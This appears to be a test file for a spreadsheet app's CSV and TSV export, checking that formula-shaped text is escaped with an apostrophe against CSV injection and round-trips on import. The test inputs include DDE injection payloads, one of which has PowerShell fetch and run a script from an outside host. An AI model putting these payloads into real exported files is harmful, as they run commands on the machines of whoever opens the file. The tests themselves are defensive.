import { expect, it } from 'vitest';
import { Workbook } from '../src/core/workbook.js';
import { sheetToCsv, sheetToTsv, rangeToCsv, workbookFromFile } from '../src/core/io.js';
import { numFmtToStyle } from '../src/core/format.js';

function book() {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  const texts = ["=cmd|' /C calc'!A0", '+1', '-x', '@SUM(A1)', '\tlead', '\rreturn', 'plain'];
  wb.setCells(id, [
    ...texts.map((v, c) => ({ r: 0, c, cell: { v, f: null } })),
    { r: 1, c: 0, cell: { v: -5, f: null } },
    { r: 1, c: 1, cell: { v: -5, f: null, s: { fmt: 'currency', cur: 'USD', dec: 2 } } },
    { r: 1, c: 2, cell: { v: true, f: null } },
    { r: 1, c: 3, cell: { v: null, f: '"=HYPERLINK(""x"")"' } },
    { r: 1, c: 4, cell: { v: null, f: '1/0' } },
    { r: 1, c: 5, cell: { v: 'a=b', f: null } },
  ]);
  return { wb, id };
}

// A text cell starting with =, +, -, @, a tab or a carriage return is run as a formula by
// programs that open the exported file (Excel with DDE, say). Such text is written with a
// leading apostrophe and quoted, as spreadsheet programs do; numbers are left alone.
it('marks formula-shaped text with an apostrophe in CSV and TSV exports, leaving numbers as they are', () => {
  const { wb, id } = book();
  const csv = sheetToCsv(wb, id).replace(/^﻿/, '');
  expect(csv).toBe(
    `"'=cmd|' /C calc'!A0","'+1","'-x","'@SUM(A1)","'\tlead","'\rreturn",plain\r\n`
    + `-5,-$5.00,TRUE,"'=HYPERLINK(""x"")",#DIV/0!,a=b,\r\n`,
  );
  const tsv = sheetToTsv(wb, id).replace(/^﻿/, '');
  expect(tsv.split('\r\n')[0]).toBe(`"'=cmd|' /C calc'!A0"\t"'+1"\t"'-x"\t"'@SUM(A1)"\t"'\tlead"\t"'\rreturn"\tplain`);
  expect(tsv.split('\r\n')[1]).toBe(`-5\t-$5.00\tTRUE\t"'=HYPERLINK(""x"")"\t#DIV/0!\ta=b\t`);
  expect(rangeToCsv(wb, id, { r1: 1, c1: 0, r2: 1, c2: 1 })).toBe('﻿-5,-$5.00\r\n');
});

// An apostrophe before formula-shaped text is the guard mark an export put there, this app's own
// or Excel's: the text comes back as it was, still text. Before anything else the apostrophe is
// data, as Excel and Sheets read it.
it('reads the guarded text back as the text it was, without the mark, and the numbers as numbers', async () => {
  const { wb, id } = book();
  const back = await workbookFromFile(new TextEncoder().encode(sheetToCsv(wb, id)), 'guarded.csv');
  const bid = back.activeSheetId;
  for (const [c, text] of ["=cmd|' /C calc'!A0", '+1', '-x', '@SUM(A1)', '\tlead', '\rreturn', 'plain'].entries()) {
    expect(back.getCell(bid, 0, c)).toMatchObject({ v: text, f: null });
  }
  expect(back.getCell(bid, 1, 3)).toMatchObject({ v: '=HYPERLINK("x")', f: null });
  expect(back.getValue(bid, 1, 0)).toBe(-5);
  expect(back.getValue(bid, 1, 1)).toBe(-5);
  expect(back.getValue(bid, 1, 2)).toBe(true);
  const other = await workbookFromFile(new TextEncoder().encode("'plain,'#N/A,'+1 555 123 4567,'007,'=,'-\n"), 'marks.csv');
  const oid = other.activeSheetId;
  expect([0, 1, 2, 3, 4, 5].map((c) => other.getValue(oid, 0, c))).toEqual(["'plain", "'#N/A", "'+1 555 123 4567", "'007", '=', "'-"]);
});

// The payloads CSV injection is actually written with: a DDE command behind a +, - or @ that no
// formula parser here accepts but Excel and LibreOffice run. Each is marked on the way out and
// comes back as the text it was, while a phone number travels unmarked.
it('marks a DDE command hidden behind +, - or @, and round-trips every field exactly', async () => {
  const texts = [
    "-2+3+cmd|' /C calc'!A0",
    "+2+3+cmd|' /C calc'!A0",
    '@SUM(1+9)*cmd|\' /C calc\'!A0',
    "-1+1+cmd|'/c powershell IEX(wget 0r.pe/p)'!A0",
    '=1+1',
    '-abc',
    '@handle',
    '+1 555 123 4567',
  ];
  const wb = new Workbook();
  const id = wb.activeSheetId;
  wb.setCells(id, texts.map((v, r) => ({ r, c: 0, cell: { v, f: null } })));
  const fields = sheetToCsv(wb, id).replace(/^﻿/, '').split('\r\n');
  texts.forEach((text, r) => expect(fields[r]).toBe(r === 7 ? text : `"'${text}"`));
  const back = await workbookFromFile(new TextEncoder().encode(sheetToCsv(wb, id)), 'dde.csv');
  expect(texts.map((_, r) => back.getCell(back.activeSheetId, r, 0))).toEqual(texts.map((v) => ({ v, f: null })));
});

// A phone number is written with a leading +, and no program runs one as a formula: it travels
// unmarked, and comes back as it went. The exemption covers only that shape — a sign and then
// digits, spaces, brackets, dots and dashes — so "- see note" and "-1+1" are marked instead.
it('leaves a phone number and a dashed or bracketed signed number unmarked', async () => {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  const texts = ['+1 555 123 4567', '+49 (0) 30 1234', '-1.2.3', '--', '- see note', '-abc', '@handle', '@ home', '-1+1'];
  wb.setCells(id, texts.map((v, c) => ({ r: 0, c, cell: { v, f: null } })));
  expect(sheetToCsv(wb, id).replace(/^﻿/, '')).toBe(`+1 555 123 4567,+49 (0) 30 1234,-1.2.3,--,"'- see note","'-abc","'@handle","'@ home","'-1+1"\r\n`);
  expect(sheetToTsv(wb, id).replace(/^﻿/, '').split('\r\n')[0]).toBe(`+1 555 123 4567\t+49 (0) 30 1234\t-1.2.3\t--\t"'- see note"\t"'-abc"\t"'@handle"\t"'@ home"\t"'-1+1"`);
  const back = await workbookFromFile(new TextEncoder().encode(sheetToCsv(wb, id)), 'phones.csv');
  // Marked or not, every field comes back as the text it went in as.
  expect(texts.map((_, c) => back.getCell(back.activeSheetId, 0, c))).toEqual(texts.map((v) => ({ v, f: null })));
});

// A number's displayed text can start like a formula too, when its custom format prepends
// the character (`"="0`, `\=0`, `"@"0`): another program opening the file would run it as
// one. Such text is guarded like a text cell's, while a number whose text still reads back
// as a number (-5, -$5.00, -50%, -1E+21, +5 from a "+"0 format, -1 1/2) stays as it is.
it('guards a number whose format shows it as formula-shaped text, leaving numeric text alone', () => {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  wb.setCells(id, [
    { r: 0, c: 0, cell: { v: 5, f: null, s: numFmtToStyle('"=cmd|\' /C calc\'!A0"0') } },
    { r: 0, c: 1, cell: { v: 5, f: null, s: numFmtToStyle('\\=0') } },
    { r: 0, c: 2, cell: { v: 5, f: null, s: numFmtToStyle('"+"0;"-"0') } },
    { r: 0, c: 3, cell: { v: 5, f: null, s: numFmtToStyle('"@"0') } },
    { r: 0, c: 4, cell: { v: null, f: '2+3', s: numFmtToStyle('"=SUM(A1)"0') } },
    { r: 1, c: 0, cell: { v: -1234567.891, f: null, s: { fmt: 'number', dec: 2, group: true } } },
    { r: 1, c: 1, cell: { v: -0.5, f: null, s: { fmt: 'percent', dec: 0 } } },
    { r: 1, c: 2, cell: { v: -1e21, f: null } },
    { r: 1, c: 3, cell: { v: 5, f: null, s: numFmtToStyle('+0;-0') } },
    { r: 1, c: 4, cell: { v: -1.5, f: null, s: numFmtToStyle('# ?/?') } },
  ]);
  const lines = sheetToCsv(wb, id).replace(/^﻿/, '').split('\r\n');
  expect(lines[0]).toBe(`"'=cmd|' /C calc'!A05","'=5",+5,"'@5","'=SUM(A1)5"`);
  expect(lines[1]).toBe('"-1,234,567.89",-50%,-1E+21,+5,-1 1/2');
});

// A lone "-", "+" or "@" is a dash or a sign, never a formula, and "--" reads as no formula either: Excel and Sheets write them as they are.
it('leaves a field that is only a dash, a plus or an at sign unmarked', () => {
  const wb = new Workbook();
  const id = wb.activeSheetId;
  wb.setCells(id, [
    { r: 0, c: 0, cell: { v: '-', f: null } },
    { r: 0, c: 1, cell: { v: '+', f: null } },
    { r: 0, c: 2, cell: { v: '@', f: null } },
    { r: 0, c: 3, cell: { v: '=', f: null } },
    { r: 0, c: 4, cell: { v: '--', f: null } },
  ]);
  expect(sheetToCsv(wb, id).replace(/^﻿/, '')).toBe(`-,+,@,"'=",--\r\n`);
  expect(sheetToTsv(wb, id).replace(/^﻿/, '')).toBe(`-\t+\t@\t"'="\t--\r\n`);
});
